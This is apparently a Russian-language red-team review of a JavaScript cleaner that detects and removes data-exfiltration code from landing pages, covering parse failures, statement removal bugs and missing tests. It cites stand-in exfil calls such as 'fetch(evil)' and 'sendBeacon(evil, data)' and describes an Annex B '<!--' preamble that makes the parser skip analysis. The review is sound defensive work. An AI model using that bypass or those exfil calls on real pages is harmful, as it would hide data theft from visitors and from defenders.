# Red Team: Тир 3b — AST-ядро и inline-exfil

- [`ast/parse.ts`](src/mastra/cleaners/passes/js-advanced/ast/parse.ts) — фундамент под всеми AST-детекторами
- [`ast/types.ts`](src/mastra/cleaners/passes/js-advanced/ast/types.ts) — типы (без логики)
- [`js-advanced/index.ts`](src/mastra/cleaners/passes/js-advanced/index.ts) — пустая заглушка
- [`remove-inline-exfil.ts`](src/mastra/cleaners/passes/js-advanced/remove-inline-exfil.ts)
- [`extract-useful-functions.ts`](src/mastra/cleaners/passes/js-advanced/extract-useful-functions.ts)

**Сильные стороны:** `parseJs` пробует module→script (лендинги разные); удаление через `MagicString`
с сортировкой позиций по убыванию (корректно против сдвигов); `extractUsefulFunctions` консервативен
(DOM-операции / смешанные вызовы → не трогаем).

---

## ast/parse.ts

### [PARSE-1] 🔴 Bypass · 🟨 Medium · acorn не парсит browser-толерантный синтаксис → AST-анализ пропущен

- **Сценарий:** атакующий начинает exfil-`.js` с Annex B HTML-комментария `<!-- ` или `-->` (легаси,
  браузеры в classic-script их **исполняют/игнорируют**, acorn — нет).
- **Сейчас:** `parseJs` пробует module и script с `ecmaVersion: 2024`, без Annex B. Оба падают →
  `return null` ([:24](src/mastra/cleaners/passes/js-advanced/ast/parse.ts:24)).
- **Последствие:** `null` → в `clean-js` **весь** advanced-анализ файла пропускается (CJS-3): ни
  metric, ни exfil-extraction, ни keylogger/redirect/docwrite. Браузер файл выполняет, наши детекторы
  его не видели. Дешёвый дядж AST-слоя. (Тот же эффект — у любого acorn-непарсимого, но Annex B —
  намеренный вектор.)
- **Рекомендация:** включить Annex B / препроцессить `<!--`/`-->`; и обязательно — не «тихо null»
  (см. PARSE-2): непарсимый файл → карантин/громкий флаг, а не пропуск.
- **Уверенность:** поведение acorn (Annex B по умолчанию выкл.) — подтверждено; версия-зависимо.

### [PARSE-2] 🟡 Robustness/Visibility · 🟨 Medium · ошибка парса — только в `console.warn`, не в отчёте

- **Сейчас:** при провале — `console.warn(...)` ([:23](src/mastra/cleaners/passes/js-advanced/ast/parse.ts:23))
  и `null`. В `clean-report.md`/changelog это **не попадает**.
- **Последствие:** пользователь, читающий отчёт, не узнает, что файл не анализировался (усиливает
  [CJS-3](3a-js-orchestration.md)). «Тихая» слепая зона.
- **Рекомендация:** прокидывать факт «не распарсилось» в changelog/stats, а не в stdout.
- **Уверенность:** подтверждено чтением кода.

### [PARSE-3] 🟩 Low · module-first и отсутствие лимитов

Порядок module→script может слегка по-иному трактовать редкие script-валидные конструкции; нет лимита
размера/времени парса (гигантский bundle парсится целиком в память, `locations:true` добавляет вес).
Низкий приоритет.

---

## remove-inline-exfil.ts

### [RIE-1] 🟡 Robustness · 🟨 Medium · удаление по узлу: statement vs expression (зависит от 3c)

- **Сейчас:** удаляет `detection.start..end` + trailing `;`/пробелы
  ([:30–33](src/mastra/cleaners/passes/js-advanced/remove-inline-exfil.ts:30)), вперёд по тексту.
- **Последствие:** если `detectExfilCalls` (3c) возвращает узел **CallExpression** (а не
  ExpressionStatement), то для `var x = fetch(evil)` / `await fetch(evil)` / `return fetch(evil)` /
  `a && fetch(evil)` удалится только вызов → останется `var x = ;` / `await ;` → **битый JS**
  (хвост захватывается, а префикс `var x =` — нет). Корректность зависит от гранулярности узла в 3c.
- **Рекомендация:** удалять охватывающий **statement** (подниматься до ExpressionStatement), а если
  exfil в выражении-значении — заменять на безопасный no-op (`void 0`), а не вырезать. Нить **T-9**.
- **Уверенность:** логика удаления подтверждена; гранулярность узла — в `detect-exfil-calls` (3c).

---

## extract-useful-functions.ts

### [EUF-1] 🟡 Robustness · 🟧 High · удаляется ОБЪЯВЛЕНИЕ функции без учёта мест вызова → ReferenceError

- **Сейчас:** функция, где **все** вызовы — exfil и нет DOM-паттернов, удаляется целиком
  ([:94](src/mastra/cleaners/passes/js-advanced/extract-useful-functions.ts:94)). Удаляется только
  **определение**; места вызова (`track()`, `onload=track`, `setInterval(track,…)`) — нет.
- **Последствие:** именованную функцию обычно **где-то зовут**. Убрали `function track(){…}`, а
  `track()` остался → `ReferenceError: track is not defined` → **исполнение скрипта прерывается**, и
  весь код после вызова (квиз/кнопка оффера) не работает. Это ломает даже **штатный** кейс (удалить
  трекер-функцию), потому что её вызов не снимается. IIFE и анонимные не попадают (обрабатываются
  только `FunctionDeclaration` и `var f = function`), а именно именованные чаще всего и вызываются.
- **Рекомендация:** не удалять объявление, а **заменять тело на no-op** (`function track(){}`) —
  символ сохраняется, exfil исчезает; либо убирать и все ссылки/вызовы (сложнее). Удаление
  объявления — reference-unsafe.
- **Уверенность:** подтверждено чтением кода (вызовы не трогаются).

### [EUF-2] 🟢 Soundness (FN) · 🟨 Medium · во внешних `.js` режутся только целые pure-exfil функции, не «рассыпанный» exfil

- **Сейчас:** для внешних `.js` `clean-js` зовёт `extractUsefulFunctions` (функции целиком), но **не**
  `removeInlineExfil` (statement-level — только для inline `<script>`).
- **Последствие:** top-level `sendBeacon(evil, data)` / `fetch(evil)` вне «чисто-exfil» функции во
  внешнем файле **не вырезается** (лишь generic-warn от regex-слоя). Асимметрия: inline-скрипты
  получают точечную хирургию exfil, внешние `.js` — только удаление целых функций.
- **Рекомендация:** прогонять `removeInlineExfil` (statement-level) и по внешним `.js`, а не только
  inline.
- **Уверенность:** подтверждено чтением `clean-js` (removeInlineExfil не зовётся для файлов).

### [EUF-3] 🟢 Soundness · 🟩 Low · консервативные пропуски

`var a=fn1,b=fn2` (мульти-декларатор) и arrow-с-expression-body пропускаются
([:107–114](src/mastra/cleaners/passes/js-advanced/extract-useful-functions.ts:107)) — это безопасные
FN (оставляем). `hasDomOperations` — узкий список из 10 подстрок; вторичный guard после «все вызовы
exfil», поэтому не критично. Низкий приоритет.

---

## js-advanced/index.ts

### [IDX-1] 🟩 Low · пустая заглушка

Файл — только комментарий «Public API re-exports … will go here»
([:1](src/mastra/cleaners/passes/js-advanced/index.ts:1)). Не используется (pipeline импортит модули
напрямую). Мёртвый плейсхолдер — убрать или наполнить.

---

## Пробелы в тестах

Нужны: PARSE-1 (`<!--`-преамбула → файл должен быть проанализирован или явно карантинирован),
EUF-1 (удалённая pure-exfil функция, которую зовут → не должно быть ReferenceError), EUF-2 (top-level
exfil во внешнем `.js`), RIE-1 (exfil в `var x = fetch(...)` → не оставлять `var x = ;`).

## Итог

1. **EUF-1** — High: заменять тело на no-op вместо удаления объявления (иначе ReferenceError ломает
   страницу даже в штатном кейсе).
2. **PARSE-1 + PARSE-2** — Annex B/непарсимое не должно тихо выключать анализ; флагать в отчёт.
3. **EUF-2 + RIE-1 (T-9)** — распространить statement-level exfil-хирургию на внешние `.js`, удалять
   охватывающий statement, а не голый вызов.
